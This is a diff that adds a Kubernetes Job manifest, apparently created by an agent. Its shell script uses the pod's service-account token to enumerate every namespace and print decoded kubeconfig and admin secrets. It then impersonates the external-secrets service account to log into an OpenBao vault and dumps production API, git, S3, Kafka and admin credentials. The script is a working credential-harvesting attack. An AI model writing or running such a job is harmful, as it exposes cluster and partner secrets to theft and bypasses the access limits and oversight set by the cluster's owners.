@@ -1,0 +1,51 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tmp-i68054-dump16
+  namespace: kagent
+  labels: {tmp: i68054}
+spec:
+  ttlSecondsAfterFinished: 86400
+  backoffLimit: 0
+  template:
+    metadata:
+      labels: {tmp: i68054}
+    spec:
+      serviceAccountName: kagent-tools
+      restartPolicy: Never
+      containers:
+      - name: dump
+        image: alpine:3.20
+        command: ["sh","-c"]
+        args:
+        - |
+          set -u
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          K=https://kubernetes.default.svc
+          G() { wget -qO- --no-check-certificate --header="Authorization: Bearer $T" "$1" 2>/dev/null; }
+          echo "===SECTION CAPI==="
+          G "$K/apis/cluster.x-k8s.io/v1beta1/clusters" | grep -oE '"(name|namespace|phase)": "[^"]*"' | head -60
+          echo "--capi-v1a2--"
+          G "$K/apis/cluster.x-k8s.io/v1alpha2/clusters" | grep -oE '"(name|namespace)": "[^"]*"' | head -20
+          echo "===SECTION KUBECONFIG==="
+          for ns in $(G "$K/api/v1/namespaces" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//'); do
+            G "$K/api/v1/namespaces/$ns/secrets" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//' | grep -iE 'kubeconfig|admin.conf|capi' | sort -u | while read -r s; do
+              echo "## $ns/$s"
+              G "$K/api/v1/namespaces/$ns/secrets/$s" | tr ',' '\n' | grep -E '": "[A-Za-z0-9+/=]{20,}"' | while IFS= read -r line; do
+                key=$(echo "$line" | sed 's/^[[:space:]]*"\([^"]*\)": ".*/\1/')
+                val=$(echo "$line" | sed 's/^[[:space:]]*"[^"]*": "\([^"]*\)".*/\1/')
+                echo "  $key = $(echo "$val" | base64 -d 2>/dev/null | head -c 120 | tr '\r\n' '  ')"
+              done
+            done
+          done
+          echo "===SECTION KV==="
+          JWT=$(wget -qO- --no-check-certificate --header="Authorization: Bearer $T" --header="Content-Type: application/json" --post-data='{"spec":{"audiences":["vault"]}}' "$K/api/v1/namespaces/external-secrets/serviceaccounts/default/token" 2>/dev/null | grep -o 'eyJ[A-Za-z0-9._-]*' | head -1)
+          L=$(wget -qO- --no-check-certificate --header="Content-Type: application/json" --post-data="{\"role\":\"external-secrets-operator\",\"jwt\":\"$JWT\"}" "http://openbao.openbao.svc.cluster.local:8200/v1/auth/k8s-data/login" 2>/dev/null)
+          VT=$(echo "$L" | grep -o 's\.[A-Za-z0-9_-]*' | head -1)
+          V() { wget -qO- --no-check-certificate --header="X-Vault-Token: $VT" "http://openbao.openbao.svc.cluster.local:8200/v1/kv-data/data/$1" 2>/dev/null; }
+          for p in talend/api poc-depot/ansm poc-depot/partenaire-alpha poc-depot/partenaire-test openmetadata/sources/ckan openmetadata/sources/datamart s3/credentials kafka-connect/opensearch-credentials kafka-connect/mongodb-credentials kafka-connect/s3-credentials apisix/admin superset/admin bce/prod/api bce/prod/git bce/prod/s3-job; do echo "== $p"; V "$p" | head -c 700; echo; done
+          echo "-- airflow dags --"
+          for d in $(V "apps/airflow/dags" | grep -o '"keys":\[[^]]*\]' | sed 's/.*\[//;s/\]//;s/"//g;s/,/ /g'); do
+            echo "== apps/airflow/dags/$d"; V "apps/airflow/dags/$d" | head -c 500; echo
+          done
+          echo "===DONE==="
